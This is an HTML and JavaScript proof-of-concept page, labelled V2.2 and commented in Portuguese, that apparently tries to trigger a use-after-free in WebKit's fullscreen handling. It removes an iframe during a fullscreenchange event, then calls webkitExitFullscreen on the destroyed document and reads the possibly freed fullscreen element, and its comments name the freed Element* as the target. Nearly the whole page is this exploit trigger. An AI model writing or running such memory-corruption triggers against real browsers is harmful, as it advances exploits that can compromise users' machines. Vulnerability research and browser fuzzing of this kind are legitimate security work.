<html>
<body>
<button id="run">Run V2.2</button>
<div id="status">Ready</div>
<iframe id="testFrame" width="100" height="100"></iframe>
<script>
/*
  V2.2: iframe.remove() primeiro, depois webkitExitFullscreen() no iDoc salvo.
  O Document está destruído mas chamamos um método no FullscreenManager
  que precisa despachar evento para o Element* freed.
  iDoc é mantido vivo pelo JS wrapper mas o Element interno pode ser freed.
*/
var iframe = document.getElementById("testFrame");
var popup  = null;

iframe.onload = function() {
    var iDoc = iframe.contentDocument; // salva referência antes do remove

    iDoc.open();
    iDoc.write(
        '<!DOCTYPE html><html><body>' +
        '<div style="width:200px;height:150px;background:blue"></div>' +
        '</body></html>'
    );
    iDoc.close();

    iDoc.addEventListener('webkitfullscreenchange', function() {
        document.getElementById("status").innerHTML = "child fullscreenchange";

        // Remove primeiro — Document freed
        if (iframe && iframe.parentNode) iframe.remove();
        if (popup && !popup.closed) popup.close();

        // Chama exitFullscreen no Document já destruído
        // FullscreenManager precisa despachar evento para Element* freed
        try {
            iDoc.webkitExitFullscreen();
            document.getElementById("status").innerHTML += " | exit OK pós-remove";
        } catch(e) {
            document.getElementById("status").innerHTML += " | exitEX pós-remove:" + e;
        }

        // Acessa webkitFullscreenElement do iDoc destruído
        try {
            var el = iDoc.webkitFullscreenElement;
            document.getElementById("status").innerHTML +=
                " | fsEl=" + (el ? el.tagName : "null");
            if (el) {
                // Dereference do Element* possivelmente freed
                document.getElementById("status").innerHTML +=
                    " clientW=" + el.clientWidth;
            }
        } catch(e) {
            document.getElementById("status").innerHTML += " | fsElEX:" + e;
        }
    });

    iDoc.documentElement.webkitRequestFullscreen();

    setTimeout(function() {
        if (!popup || popup.closed) return;
        popup.focus();
        window.focus();
        try { iframe.contentWindow.focus(); } catch(e) {}
        setTimeout(function() {
            if (popup && !popup.closed) popup.close();
        }, 300);
    }, 300);
};

document.getElementById("run").onclick = function() {
    document.getElementById("status").innerHTML = "iniciando...";
    popup = window.open("", "_blank", "width=400,height=300");
    if (!popup) { document.getElementById("status").innerHTML = "bloqueado"; return; }
    popup.document.open();
    popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
    popup.document.close();
};
</script>
</body>
</html>
